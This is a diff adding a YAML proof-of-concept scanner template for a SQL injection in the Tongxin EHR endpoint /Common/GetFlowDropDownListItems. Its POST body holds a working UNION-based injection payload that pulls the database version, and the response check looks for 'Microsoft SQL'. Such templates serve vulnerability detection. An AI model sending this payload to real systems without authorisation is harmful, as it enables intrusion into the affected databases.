@@ -1,0 +1,24 @@
+name: poc-yaml-tongxinEHR-GetFlowDropDownListItems-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Common/GetFlowDropDownListItems
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+      body: FixedFormCode=1%27%20UNION%20ALL%20SELECT%20NULL%2C@@VERSION--
+    expression: response.status == 200 && response.body.bcontains(b'Microsoft SQL')
+
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486952&idx=1&sn=29793380904fdaa457ab73d2e9fc454a&chksm=c267b8dbf51031cd60d24d1f3dcaf4c2382753f1db0e591a02ff1775ce7a969bfd5412f78ed9&token=239710718&lang=zh_CN#rd
+
+
+
